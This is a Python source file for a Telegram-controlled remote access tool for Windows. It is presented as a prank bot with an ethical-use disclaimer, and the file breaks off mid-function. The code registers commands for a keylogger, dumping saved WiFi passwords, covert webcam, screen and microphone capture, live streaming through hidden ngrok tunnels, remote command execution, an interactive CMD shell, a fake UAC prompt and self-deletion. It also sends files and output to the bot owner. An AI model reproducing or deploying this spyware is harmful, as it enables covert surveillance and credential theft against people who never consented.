"""
WARNINGS:
This code is meant only to run on Windows 10/11 (7 and 8 probably work as well), the original project was to make it cross platform but then I realized it was too much work, sorry Linux.
This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
If you lose control of your telegram bot, you could potentially lose the control of YOUR OWN MACHINE.

Also this bot can *NOT* be put in a group, it will not work.

~Riccardo Zappitelli
"""


__version__ = "2.50" # I kinda forget about this every 10 commits but its kinda funny at this point


#TELEGRAM
import requests
from telepot import Bot, glance
from telepot.loop import MessageLoop
from telepot.exception import TelegramError
from urllib3.exceptions import MaxRetryError
from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup

#IMAGES
import numpy as np
from PIL import Image
from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                 setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                 destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT, WINDOW_NORMAL, CAP_PROP_FPS, resizeWindow)

#MERGE AUDIO&VIDEO
from moviepy.editor import AudioFileClip, VideoFileClip

#AUDIO
import soundfile as sf
import sounddevice as sd

#MISC
import sys
import json
import ctypes
import psutil
import socket
import inspect
import traceback
from io import BytesIO
import pyautogui as pg
import subprocess as sp
from shutil import copy2
from re import findall, M
from time import time, sleep
from tkinter import Tk, Label
from datetime import datetime
from tempfile import gettempdir
from typing import Any, Callable
from random import choice, randint
from winotify import audio, Notification
from random import uniform, choice, random
from webbrowser import open as browseropen
from string import ascii_letters, printable
from subprocess import CREATE_NO_WINDOW, PIPE, Popen
from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize


#UTILS
import pyngrok
from utils import *
try:
    from plugins import *
except ImportError as e:
    print(f"Plugins not loaded\n{e}\n")
    plugins = None

def resource_path(relative_path: str) -> str:
    if getattr(sys, 'frozen', False):
        base_path = dirname(sys.executable)
    else:
        base_path = dirname(__file__)
    return join(base_path, relative_path)

# CONSTANTS
logging = False
iswindows = name == "nt"
islinux = not iswindows
cwd_folder = getcwd()
HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
BURN_DIRECTORY = gettempdir()
TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
GENERATE_COMMANDS_MD = False


try:
    vfx = resource_path(join("assets", "vfx"))
    sfx = resource_path(join("assets", "sfx"))
    executables = resource_path(join("assets", "executables"))
    fake_uac_prompt_path = join(executables, "fakeuac.exe")
    prototxt_filename = resource_path(join("assets","model","1.prototxt"))
    caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
except Exception as e:
    print(e)
    exit()

def _patched_popen(*args, **kwargs):
    cmd_list = []
    if args:
        cmd_list = list(args)
    elif 'args' in kwargs:
        cmd_list = kwargs['args'] if isinstance(kwargs['args'], list) else [kwargs['args']]
    if any("ngrok" in str(part).lower() for part in cmd_list):
        kwargs["creationflags"] = kwargs.get("creationflags", 0) | CREATE_NO_WINDOW
    kwargs.setdefault("stderr", PIPE)
    kwargs.setdefault("stdout", PIPE)
    return Popen(*args, **kwargs)

def close_all_tunnels(ngrok):
    tunnels = ngrok.get_tunnels()
    for tunnel in tunnels:
        try:
            ngrok.disconnect(tunnel.public_url)
        except Exception as e:
            print(f"Failed to disconnect {tunnel.public_url}: {e}")

def randomname(lenght: int=10) -> str:
    return "".join([ choice(ascii_letters) for _ in range(lenght)])

while isfile(BURN_DIRECTORY):
    BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)

if isfile(prototxt_filename) and isfile(caffemodel_filename):
    with open(prototxt_filename, 'rb') as f:
        prototxt_data = f.read()
    with open(caffemodel_filename, 'rb') as f:
        caffemodel_data = f.read()
    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
    FACERECOGNITION = True
    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
else:
    FACERECOGNITION = False

def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

#GETTING TOKEN AND CHAT_ID
def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
    """
    returns token, chatid, ngrok_token, tunnel_provider
    """
    with open(filename) as fi:
        var = json.load(fi)
    return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
        
#Resizing assets so they all take the same time to load when doing jumpscares(I guess)
def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
    img = Image.fromarray(image_array)
    img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
    buffer = BytesIO()
    img_resized.save(buffer, 'JPEG', quality=quality)
    buffer.seek(0)
    compressed_image = np.array(Image.open(buffer))
    return compressed_image

def show_image_fullscreen(image, timeout=1250) -> None:
    namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
    setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
    setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
    imshow("FullScreenImage", image) 
    waitKey(timeout)
    destroyAllWindows()

def invert_image(imagearray:np.array) -> np.array:
    return bitwise_not(imagearray)

def distorted_screen(image, strength=5, frequency=50):
    h, w, _ = image.shape
    map_x, map_y = np.meshgrid(np.arange(w, dtype=np.float32), np.arange(h, dtype=np.float32))

    map_x += np.sin(map_y / frequency) * strength
    map_y += np.cos(map_x / frequency) * strength

    distorted = remap(image, map_x, map_y, interpolation=INTER_LINEAR, borderMode=BORDER_REFLECT)
    return distorted

def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
    if not FACERECOGNITION:
        return False, None
    rls=True
    if cap:
        rls=False
    else:
        cap = VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        return 0, None
    if rls:
        cap.release()
    blob = dnn.blobFromImage(frame, 1.0, (300, 300), (104.0, 177.0, 123.0), False, False)
    net.setInput(blob)
    detections = net.forward()
    return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame

def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
    return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }

def load_audios(sfx_folder: str=sfx) -> list[str]:
    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }

def randompngname(lenght: int=10) -> str:
    return randomname(lenght)+".png"

def get_current_wallpaper():
    SPI_GETDESKWALLPAPER = 0x0073
    MAX_PATH = 260
    buffer = ctypes.create_unicode_buffer(MAX_PATH)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
    path = buffer.value
    return path if isfile(path) else None

def get_function_parameters(func):
    sig = inspect.signature(func)
    params = []
    for name, param in sig.parameters.items():
        if param.kind == inspect.Parameter.VAR_POSITIONAL:
            params.append(f'*{name}')
        elif param.kind == inspect.Parameter.VAR_KEYWORD:
            params.append(f'**{name}')
        else:
            params.append(name)
    return params

def get_required_params(func):
    sig = inspect.signature(func)
    return [
        name for name, param in sig.parameters.items()
        if param.default == inspect.Parameter.empty
        and param.kind in (
            inspect.Parameter.POSITIONAL_ONLY,
            inspect.Parameter.POSITIONAL_OR_KEYWORD,
            inspect.Parameter.KEYWORD_ONLY
        )
    ]

def backup_wallpaper(backup_path):
    current_wallpaper = get_current_wallpaper()
    if exists(current_wallpaper):
        copy2(current_wallpaper, backup_path)
        return True
    else:
        return False

def change_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20  
    SPIF_UPDATEINIFILE = 0x01  
    SPIF_SENDWININICHANGE = 0x02  

    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abspath(image_path),
                                                   SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
        return True
    except Exception as e:
        return False

def pad_to_16_9(image):
    height, width = image.shape[:2]
    current_ratio = width / height
    target_ratio = 16 / 9
    if abs(current_ratio - target_ratio) < 0.01:
        return image
    if current_ratio > target_ratio:
        new_height = int(width / target_ratio)
        pad = (new_height - height) // 2
        padded = copyMakeBorder(image, pad, new_height - height - pad, 0, 0, BORDER_CONSTANT, value=(0, 0, 0))
    else:
        new_width = int(height * target_ratio)
        pad = (new_width - width) // 2
        padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
    return padded

def notify_toast(appname: str, title: str, message: str, url_label: str, url: str) -> None:
    toast = Notification(
        app_id=appname, 
        title=title,
        msg=message,
        duration="short",
    )

    toast.add_actions(label=url_label, launch=url)
    toast.set_audio(audio.Default, loop=False)
    toast.show()

def terminate_process_by_name(process_name: str) -> None:
    for proc in psutil.process_iter():
        if proc.name().lower() == process_name.lower().strip():
                proc.terminate()


"""
ooooooooo.     .oooooo.   ooooooooo.
`888   `Y88.  d8P'  `Y8b  `888   `Y88.
 888   .d88' 888           888   .d88'  .ooooo.  oo.ooooo.
 888ooo88P'  888           888ooo88P'  d88' `88b  888' `88b
 888`88b.    888           888         888ooo888  888   888
 888  `88b.  `88b    ooo   888         888    .o  888   888
o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  888
                                                 o888o
"""
class PeppinoTelegram:
    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
        self.token = token
        self.owner_id = owner_id
        self.ngrok_token = ngrok_token
        self.can_use_ngrok = bool(ngrok_token)
        self.tunnelhandler = TunnelManager(tunnel_provider)
        self.tunnel_provider = tunnel_provider

        # Need to add this one so someone who spams my bot won't spam me
        self.strangers : list[int] = []

        if signal_error:
            self.bsend(signal_error)

        self.loading_bar_set = loading_bar_set
        self.loading_bar_spinner = loading_bar_spinner

        # this is used to send input prompts to the user without stopping the code
        self.user = {
            "status":None,             #can be "input_requested" or None 
            "last_response":None       #can be None, or the last response of an input
        }

        self.MOUSE_JMP = 50

        self.webcam_url = None
        self.screen_url = None
        self.webcam_and_screen_url = None

        self.process_killer_page = 0
        self.owner_name = ""
        self.connected = check_connection()

        self.cap = capture
        self.bot = Bot(token) 
        self.cantopenlist = []
        self.processmonitorlist = {} 
        self.duckyhelp = DUCKYHELP
        self.explorer_path = getcwd() # For now I'm not looing forward to make a file explorer
        self.audio_mixer = mixer
        self.running = True
        self.message_timeout = 5

        self.process_explorer_menu = None
        self.mixer_menu_keyboard = None
        self.mouse_controller_menu = None
        self.processmonitormenu = None
        self.display_mode_keyboard  = None
        self.cantopenmenu_ref = None
        self.mainmenu_ref = None

        self.overlay_tk = OverlayManager(self, BURN_DIRECTORY)
        self.overlay_opencv = OpenCVOverlayPlayer()

        self.wifidumper = WifiDumper()
        self.all_session_messages: list[int] = []

        self.bars: dict[int:LoadingBar] = {}

        self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
        self.cmd_session_active: bool = False

        LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")

        #gets the function from the text
        self.commands = [

            # 🏠 Main Menu & Navigation (no buttons here, just category)
            Command("mainmenu", self.mainmenu, "Open the main menu.", "🏠 Menu", "🏠 Main Menu"),
            Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "🏠 Menu", "🛑 System & Shutdown"),
            Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "🏠 Menu", "🌐 Network & Remote Access"),
            Command("menu_camera", self.menu_camera, "Open Camera & Screen menu.", "🏠 Menu", "📸 Camera & Screen"),
            Command("menu_audio", self.menu_audio, "Open Audio & Volume menu.", "🏠 Menu", "🔊 Audio & Volume"),
            Command("menu_soundfx", self.menu_soundfx, "Open Sound Effects menu.", "🏠 Menu", "🎵 Sound Effects"),
            Command("menu_pranks", self.menu_pranks, "Open Pranks & Visuals menu.", "🏠 Menu", "😈 Pranks & Visuals"),
            Command("menu_control", self.menu_control, "Open System Control menu.", "🏠 Menu", "💻 System Control"),
            Command("menu_input", self.menu_input, "Open Input / Device Control menu.", "🏠 Menu", "🎮 Input / Device Control"),
            Command("menu_messaging", self.menu_messaging, "Open Messaging menu.", "🏠 Menu", "📋 Messaging"),
            Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "🏠 Menu", "🔒 Can't Open List"),
            Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "🏠 Menu", "🧠 Keylogger"),
            Command("menu_misc", self.menu_misc, "Open Misc menu.", "🏠 Menu", "🦑 Misc"),
            Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "🏠 Menu", "🔌 Your Plugins"),
            Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "🏠 Menu", "🦆 DuckyScript"),
            
            # 🛑 System & Shutdown
            Command("shutdown", self.shutdown, "Power off PC.", "🛑 System", "🛑 Shutdown"),
            Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "🛑 System", "🎭 Fakeshutdown"),
            Command("fakeuac", self.fakeuac, "Fake UAC prompt.", "🛑 System", "Fake UAC"),
            Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "🛑 System", "💣 Selfdestruction"),
            Command("clear", self.clear, "Clean windows, webcam, temp files.", "🛑 System", "🧹 Clear"),
            Command("altf4", self.altf4, "Send Alt+F4.", "🛑 System", "⌨️ Altf4"),

            # 🌐 Network & Remote Access
            Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "🌐 Network", "📶 Wifiinfo"),
            Command("getip", self.getip, "Get public IP and location.", "🌐 Network", "🌐 Get IP"),
            Command("urltoast", notify_toast, "Show Windows toast with URL.", "🌐 Network", "🔗 URL Toast"),

            # 📸 Camera & Screen
            Command("selfie", self.selfie, "Take webcam photo.", "📸 Camera", "🤳 Webcam Snapshot"),
            Command("screenshot", self.screenshot, "Capture screen.", "📸 Camera", "🖼️ Take Screenshot"),
            Command("selfieandscreenshot", self.screenshotandselfie, "Caputre screen and webcam in the same image", "📸 Camera", "🤳🖼️ Take Screenshot&Webcam"),
            Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "📸 Camera", "🎞️ Record Full Clip"),
            Command("webcamclip", self.record_webcam, "Record webcam only.", "📸 Camera", "🎥 Record Webcam"),
            Command("screenclip", self.record_screen, "Record screen only.", "📸 Camera", "🖥️ Record Screen"),
            Command("recordjum", self.record_jumpscare_reaction, "Record jumpscare reaction.", "📸 Camera", "🎙️ Record Audio Jump"),
            Command("waitforface", self.waitforface, "Capture photo when face detected.", "📸 Camera", "⏳ Waiting for Face"),
            Command("checkforface", self.checkforface, "Check for face presence.", "📸 Camera", "🔍 Check for Face"),
            Command("displaymode", self.display_mode, "Change display mode.", "📸 Camera", "🖼️ Display Options"),
            Command("webcamstreamstart", self.start_webcam_tunnel, "Start webcam stream.", "📸 Camera", "📹🟢 Start Webcam Stream"),
            Command("screenstreamstart", self.start_screen_tunnel, "Start screen stream.", "📸 Camera", "🖥️🟢 Start Screen Stream"),
            Command("webcamstreamstop", self.stop_webcam_tunnel, "Stop webcam stream.", "📸 Camera", "📹🔴 Stop Webcam Stream"),
            Command("screenstreamstop", self.stop_screen_tunnel, "Stop screen stream.", "📸 Camera", "🖥️🔴 Stop Screen Stream"),
            Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "📸 Camera", "📹🖥️🟢 Start Both Streams"),
            Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "📸 Camera", "📹🖥️🔴 Stop Both Streams"),
            Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "📸 Camera", "❌🔴 Stop All Streams"),
            Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "📸 Camera", "📷 Camera Wallpaper"),
            Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "📸 Camera", "🎞️ Set Video Wallpaper"),

            # 🔊 Audio & Volume
            Command("microphone", self.send_record_audio, "Record microphone audio.", "🔊 Audio", "🎙️ Microphone"),
            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "🔊 Audio", "🔇 Mute Volume"),
            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "🔊 Audio", "🔊 Full Volume"),
            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "🔊 Audio", "🎚️ Set Volume"),
            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "🔊 Audio", "📊 Get Volume"),
            Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "🔊 Audio", "🎛️ Mixer Menu"),
            Command("playfromurl", play_from_url, "Play audio from URL.", "🔊 Audio", "🔗 Play from URL"),
            Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "🔊 Audio", "📡 Play Noise"),
            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "🔊 Audio", "🌀📻 Video&Sound Disturbance"),

            # 🎵 Sound Effects
            Command("pss", self.pss, "Play 'psst' sound.", "🎵 Sound FX", "👂 Psst"),
            Command("psst", self.pss, "Alias for pss.", "🎵 Sound FX", "👂 Psst"),
            Command("breath", self.breath, "Play breathing sound.", "🎵 Sound FX", "🌬️ Breath"),
            Command("fart", self.fart, "Play fart sound.", "🎵 Sound FX", "💨 Fart"),
            Command("knockknock", self.knockknock, "Play knocking sound.", "🎵 Sound FX", "🚪 Knock"),
            Command("tralalerotralala", lambda: self.__play_loaded_sound("tralarero-tralala", volume=8), "Play Italian brainrot sound.", "🎵 Sound FX", "🎶 Tralalero"),
            Command("scream11s", self.scream_11s, "Play 11-second scream.", "🎵 Sound FX", "😱 11s Scream"),
            Command("scream15s", self.scream_15s, "Play 15-second scream.", "🎵 Sound FX", "😱 15s Scream"),
            Command("behindyou_kid", self.behindyou_kid, "Play 'Behind you' child voice.", "🎵 Sound FX", "👶 Behind you (kid)"),
            Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "🎵 Sound FX", "👻 Behind you (whisper)"),

            # 😈 Pranks & Visuals
            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "😈 Pranks", "👻 Jumpscare"),
            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "😈 Pranks", "😶‍🌫️ Jumpscare noaudio"),
            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "😈 Pranks", "🔄 Inverted Screen"),
            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "😈 Pranks", "🌀 Distorted Screen"),
            Command("messagebox", self.message_box, "Show custom message box.", "😈 Pranks", "💬 Message Box"),
            Command("messagespam", self.spam_windows, "Spam message boxes.", "😈 Pranks", "📨 Message Spam"),
            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "😈 Pranks", "📷 Camera Wallpaper"),
            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "😈 Pranks", "🎞️ Set Video Wallpaper"),
            Command("hdmi_drowning_effect", self.wrapper_for_hdmi_overlay, "Noise overlay effect.", "😈 Pranks", "🖥️🌀 Video Signal Drowning Effect"),
            Command("disturbed_overlay_and_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "😈 Pranks", "🌀📻 Video&Sound Disturbance"),
            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "😈 Pranks", "👻 Whisper Overlay"),

            # 🦑 Misc & Memes
            Command("plankton", self.plankton, "Plankton jumpscare.", "🦑 Misc", "🦑 Plankton"),
            Command("planktonnoaudio", self.planktonnoaudio, "Plankton without audio.", "🦑 Misc", "🔇 Plankton no audio"),
            Command("johnpork", self.johnpork, "John Pork jumpscare.", "🦑 Misc", "🐷 Johnpork"),
            Command("johnporknoaudio", self.johnporknoaudio, "John Pork without audio.", "🦑 Misc", "🔕 Johnpork no audio"),
            Command("gabinetti", self.gabinetti, "Play Gabinetti meme.", "🦑 Misc", "🛋️ Gabinetti"),
            Command("duckyscript", lambda *args: toducky(" ".join(args), execute=True), "Execute DuckyScript.", "🦑 Misc", "⌨️ Duckyscript"),
            Command("duckyhelp", lambda: self.bsend(self.duckyhelp), "Show DuckyScript help.", "🦑 Misc", "❓ Duckyhelp"),
            Command("browser", browseropen, "Open URL in browser.", "🦑 Misc", "🌐 Browser"),

            # 💻 System Control
            Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "💻 System Control", "💿 List Drives"),
            Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
            Command("execute", self.execute, "null", "null", "null"),
            Command("processkiller", self.process_killer, "Kill process from list.", "💻 System Control", "💀 Process Killer"),
            Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "💻 System Control", "🛑 Terminate Process"),
            Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "💻 System Control", "➕ Procmon Add"),
            Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "💻 System Control", "➖ Procmon Remove"),
            Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "💻 System Control", "📊 Procmon Menu"),
            Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "💻 System Control", "</> CMDSession"),

            # 🎮 Input / Device Control
            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "🎮 Input", "🎹 Randomkeyboard"),
            Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "🎮 Input", "🔠 Capslock"),
            Command("mouselock", self.mouselock, "Lock mouse position.", "🎮 Input", "🖱️ Mouselock"),
            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "🎮 Input", "🎮 Mousecontroller"),
            Command("setMouseJump", self.setMouseJump, "Set mouse jump distance.", "🎮 Input", "🎯 Set Mouse Jump"),
            Command("mouser", self.mouser, "Move mouse right.", "🎮 Input", "➡️ Move Right"),
            Command("mousel", self.mousel, "Move mouse left.", "🎮 Input", "⬅️ Move Left"),
            Command("mouseu", self.mouseu, "Move mouse up.", "🎮 Input", "⬆️ Move Up"),
            Command("moused", self.moused, "Move mouse down.", "🎮 Input", "⬇️ Move Down"),
            Command("leftclick", self.leftclick, "Left mouse click.", "🎮 Input", "🖱️ Left Click"),
            Command("rightclick", self.rightclick, "Right mouse click.", "🎮 Input", "🖱️ Right Click"),

            # 📋 Messaging
            Command("bsend", self.bsend, "Send text message.", "📋 Messaging", "📤 Bsend"),
            Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "📋 Messaging", "🆔 Id"),
            Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "📋 Messaging", "❌ Deletemessages"),
            Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "📋 Messaging", "🗑️ Deleteallmessages"),

            # 🔒 Can't Open List
            Command("cantopenadd", self.cantopen, "Block process execution.", "🔒 Can't Open", "🚫 Cantopenadd"),
            Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "🔒 Can't Open", "❌ Cantopenremove"),
            Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "🔒 Can't Open", "📋 Cantopenmenu"),

            # 🧠 Keylogger
            Command("keylogger", self.keylogger, "Log keystrokes to file.", "🧠 Keylogger", "⌨️ Keylogger"),
            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "🧠 Keylogger", "📡 Livekeylogger"),

            # 🔧 Utilities & Testing
            Command("stop", self.stop, "Stop current operation.", "🔧 Utility", "🛑 Stop"),
            Command("test", self.test, "Run test routine.", "🔧 Utility", "🧪 Test"),
            Command("help", lambda: self.bsend(self.help), "Show help menu.", "🔧 Utility", "❓ Help"),
            Command("nothing", lambda: ..., "No-op command.", "🔧 Utility", "Nothing"),
        ]

        self.help = generate_help(self.commands)
        self.function_table = {x.name:x.function for x in self.commands}
        LOADING_STATUS_MESSAGE.edit("COMMANDS LOADED, LOADING PLUGINS")

        if plugins:
            sleep(.25)
            plugins_commands = self.load_plugins(self.bot, plugins)
            if plugins_commands:
                function_table_update = {v[0]:v[1] for _,v in plugins_commands.items()}
                self.plugins_buttons = {k:f"/{v[0]}" for k,v in plugins_commands.items()}
                self.function_table.update(function_table_update)
            LOADING_STATUS_MESSAGE.edit("PLUGINS LOADED")

        sleep(.25)
        self.no_background_functions = [self.message_box, self.spam_windows]
        LOADING_STATUS_MESSAGE.edit("READY")
        LOADING_STATUS_MESSAGE.delete()

    def __play_loaded_sound(self, audio: str, volume=None) -> None:
        old = self.audio_mixer.getVolumePercentage()
        if volume:
            self.set_volume(volume)
        play_wav(self.audios[audio])
        sleep(5)
        if volume:
            self.set_volume(old)


    def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
        """
        return a message id
        """
        try:
            assert (image_name is None) ^ (image_buf is None), "You can only use either image_name or image_buf"
            if image_buf:
                msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption)["message_id"]
            if image_name:
                with open(image_name, "rb") as image:
                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
            return msg
        except Exception as e:
            return self.bsend(f"Error while sending an image\n{e}")

    def altf4(self) -> None:
        self.bsend(f"{emoji_dict['keyboard']} Alt F4 Pressed")
        press_key('alt')
        press_key('f4')
        release_key('f4')
        release_key('alt')

    def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
        return self.send_prompt(custom_message).lower().strip() == "y"

    def breath(self) -> None:
        self.__play_loaded_sound("breath")

    def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
        doit = True
        if retries>3:
            return
        try:
            # We only check connection when we're retrying
            if retries>0:
                sleep(.2)
                doit = check_connection()
            if doit:
                message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
                self.all_session_messages.append(message_id)
                return message_id
            raise ConnectionError
        except Exception as e:
            return self.bsend(text, retries+1)
    
    def bsendWithMarkdownV2(self, text: str, retries=0, reply_markup=None) -> int|None:
        self.bsend(text, retries, parse_mode="MarkDownV2", reply_markup=reply_markup)


    def download_file(self, path: str) -> None:
        self.bsend(f"📤 Sending file: {path}")
        if not isfile(path):
            self.bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
            return

        size = getsize(path)

        if size <= TELEGRAM_BOT_LIMIT:
            with open(path, "rb") as fi:
                self.bot.sendDocument(self.owner_id, fi)
                self.bsend("✅ File has been sent successfully!")
            return

        base_name = basename(path)
        part_size = TELEGRAM_BOT_LIMIT - (len(base_name) + 10)

        with open(path, "rb") as f:
            part_num = 1
            while True:
                chunk = f.read(part_size)
                if not chunk:
                    break

                part_name = f"{base_name}.part{part_num:03d}"
                with open(part_name, "wb") as pf:
                    pf.write(chunk)

                with open(part_name, "rb") as pf:
                    self.bot.sendDocument(
                        self.owner_id,
                        pf,
                        caption=f"📦 {base_name} (part {part_num})"
                    )

                remove(part_name)
                #self.bsend(f"📦 Part {part_num} sent.")
                part_num += 1

        self.bsend("✅ All file parts have been sent successfully!")

    """
.oooooo.   ooo        ooooo oooooooooo.    .oooooo..o                              o8o
d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                              `"'
888           888b     d'888   888      888 Y88bo.       .ooooo.   .oooo.o  .oooo.o oooo   .ooooo.  ooo. .oo.
888           8 Y88. .P  888   888      888  `"Y8888o.  d88' `88b d88(  "8 d88(  "8 `888  d88' `88b `888P"Y88b
888           8  `888'   888   888      888      `"Y88b 888ooo888 `"Y88b.  `"Y88b.   888  888   888  888   888
`88b    ooo   8    Y     888   888     d88' oo     .d8P 888    .o o.  )88b o.  )88b  888  888   888  888   888
`Y8bood8P'  o8o        o888o o888bood8P'   8""88888P'  `Y8bod8P' 8""888P' 8""888P' o888o `Y8bod8P' o888o o888o
    """
    def cmdsession(self) -> None:
        """Interactive CMD session via Telegram."""

        # Initialize CMD session if not already created
        if self.cmd_session is None:
            self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%")

        if self.cmd_session_active:
            self.bsend("⚠️ CMD session is already active.")
            return

        self.cmd_session_active = True
        self.bsend(
            "💻 CMD session started.\n"
            "Type 'exit' to quit.\n"
            "Use :help for special commands."
        )

        # Start output reader threads
        self.cmd_session.run_output_reader_thread(
            lambda x: self.bsend(f"📥 {x}") if x.strip() else None,
            lambda x: self.bsend(f"⚠️ {x}") if x.strip() else None
        )

        sleep(1)  # give the session time to initialize

        while True:
            sleep(0.5)
            command = self.send_prompt("🖊️ ENTER A COMMAND: ")
            arguments = command.split()
            if not arguments:
                continue

            program = arguments[0].lower()

            if program == "exit":
                self.bsend("💻 CMD session stopped.")
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session_active = False
                break

            elif program == ":help":
                self.bsend(CMD_SESSION_HELP)

            elif program == ":kill":
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session.kill()
                self.bsend(
                    "💀 CMD session killed.\n"
                    "A new one will be initialized when you use /cmdsession again."
                )
                self.cmd_session_active = False
                self.cmd_session = None
                break

            elif program == ":download":
                path = " ".join(arguments[1:])
